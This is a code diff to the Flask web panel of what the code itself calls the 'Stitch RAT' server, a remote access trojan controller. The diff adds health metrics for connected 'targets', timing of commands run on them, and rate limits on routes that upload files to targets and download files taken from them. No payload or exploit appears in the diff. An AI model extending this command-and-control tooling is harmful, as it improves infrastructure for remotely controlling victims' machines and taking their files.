@@ -451,6 +451,7 @@ def get_connections():
             
             # Update health tracking for online connections
             if is_online:
+                update_connection_activity(target)
                 now = datetime.now().isoformat()
                 if target not in connection_health:
                     connection_health[target] = {
@@ -460,7 +461,8 @@ def get_connections():
                 else:
                     connection_health[target]['last_seen'] = now
             
-            # Get health metrics
+            # Get comprehensive health metrics
+            health_status = get_connection_status(target)
             health_data = connection_health.get(target, {})
             
             # Get connection details
@@ -475,6 +477,11 @@ def get_connections():
                     'status': 'online' if is_online else 'offline',
                     'connected_at': health_data.get('connected_at', 'N/A'),
                     'last_seen': health_data.get('last_seen', 'N/A'),
+                    # Enhanced health metrics
+                    'health': health_status,
+                    'connection_quality': health_status.get('connection_quality', 'unknown') if health_status else 'unknown',
+                    'avg_response_time': health_status.get('avg_response_time', 0) if health_status else 0,
+                    'total_commands': health_status.get('total_commands', 0) if health_status else 0,
                 }
             else:
                 # New connection not yet in history
@@ -526,18 +533,38 @@ def get_active_connections():
 @login_required
 @limiter.limit(f"{API_POLLING_PER_HOUR} per hour")  # High limit for UI polling
 def server_status():
-    """Get Stitch server status"""
+    """Get Stitch server status with health metrics"""
     try:
         server = get_stitch_server()
+        health_summary = get_health_summary()
+        
         status = {
             'listening': server.listen_port is not None,
             'port': server.listen_port if server.listen_port else 'Not listening',
             'active_connections': len(server.inf_sock),
-            'server_running': server.server_thread is not None
+            'server_running': server.server_thread is not None,
+            'health_summary': health_summary,
+            'timestamp': datetime.now().isoformat()
         }
         return jsonify(status)
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+
+@app.route('/api/connections/health')
+@login_required
+@limiter.limit(f"{API_POLLING_PER_HOUR} per hour")
+def connections_health():
+    """Get detailed health information for all connections"""
+    try:
+        health_data = get_all_connections_status()
+        return jsonify({
+            'success': True,
+            'connections': health_data,
+            'summary': get_health_summary(),
+            'timestamp': datetime.now().isoformat()
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 # ============================================================================
 # Routes - Command Execution (REAL)
@@ -678,7 +705,7 @@ def export_commands():
 
 @app.route('/api/upload', methods=['POST'])
 @login_required
-@limiter.limit(f"{EXECUTIONS_PER_MINUTE} per minute")
+@limiter.limit("5 per minute")  # Strict rate limit for file uploads
 def upload_file():
     """Upload file to target - with validation"""
     import os
@@ -815,7 +842,12 @@ def execute_real_command(command, conn_id=None, parameters=None):
             return f"❌ No AES encryption key found for {conn_id}.\n\nUse 'addkey' to add the key first."
         
         # Execute command on target using stitch_lib with parameters
+        start_time = time.time()
         output = execute_on_target(target_socket, command, conn_aes_key, conn_id, parameters)
+        execution_time = time.time() - start_time
+        
+        # Record command execution metrics
+        record_command_metrics(conn_id, execution_time)
         
         return output
         
@@ -1420,6 +1452,7 @@ def get_command_history():
 
 @app.route('/api/files/downloads')
 @login_required
+@limiter.limit("20 per minute")  # Rate limit for file listing
 def list_downloads():
     try:
         downloads = []
@@ -1441,6 +1474,7 @@ def list_downloads():
 
 @app.route('/api/files/download/<path:filename>')
 @login_required
+@limiter.limit("10 per minute")  # Rate limit for file downloads
 def download_file(filename):
     try:
         filepath = os.path.join(downloads_path, filename)
@@ -1495,13 +1529,18 @@ def monitor_connections():
         time.sleep(SERVER_RETRY_DELAY_SECONDS)
 
 def start_stitch_server():
-    """Start the Stitch server"""
+    """Start the Stitch server with health monitoring"""
     log_debug("Initializing Stitch RAT server", "INFO", "Server")
     try:
         server = get_stitch_server()
         # Start listening on port 4040
         server.do_listen('4040')
         log_debug("Stitch server listening on port 4040", "INFO", "Server")
+        
+        # Start health monitoring
+        start_health_monitoring(server)
+        log_debug("Connection health monitoring started", "INFO", "Health")
+        
     except Exception as e:
         log_debug(f"Stitch server error: {str(e)}", "ERROR", "Server")
 
